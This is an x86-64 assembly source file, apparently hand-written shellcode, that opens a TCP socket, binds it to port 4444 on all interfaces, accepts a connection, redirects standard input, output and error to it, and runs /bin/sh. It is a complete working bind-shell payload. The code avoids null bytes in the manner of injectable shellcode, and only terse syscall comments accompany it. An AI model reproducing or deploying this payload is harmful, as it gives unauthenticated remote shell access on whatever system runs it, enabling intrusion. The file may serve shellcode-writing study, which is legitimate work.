section .text
global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)


	mov al, 41
	xor rdi,rdi
	add rdi, 2
	xor rsi,rsi
	add rsi, 1
	xor rdx,rdx
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	; store the second input on stack
	xor rax, rax 

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	add word [rsp-8], 0x2
	sub rsp, 8

	;moving the values in registers of bind syscall
	
	xor	rax,rax
	add al, 49
	
	mov rsi, rsp
	xor	rdx,rdx
	add rdx, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	xor	rax,rax
	add al, 50
	xor	rsi,rsi
	add rsi, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	xor	rax,rax	
	add al, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

	xor	rax,rax
        add al, 3
        syscall


        ; dup2 (new, old)
        mov rdi, r9
	xor	rax,rax
        add al, 33
        xor rsi,rsi
        syscall

	xor	rax,rax
        add al, 33
	xor	rsi,rsi
        add rsi, 1
        syscall

	xor	rax,rax
        add al, 33
	xor	rsi,rsi
        add rsi, 2
        syscall



        ; execve syscall to get /bin/sh


        xor rax, rax
        push rax


        mov rbx, 0x68732f2f6e69622f
        push rbx


        mov rdi, rsp

        push rax

        mov rdx, rsp


        push rdi


        mov rsi, rsp

        ; Calling the Execve syscall
        add rax, 59
        syscall


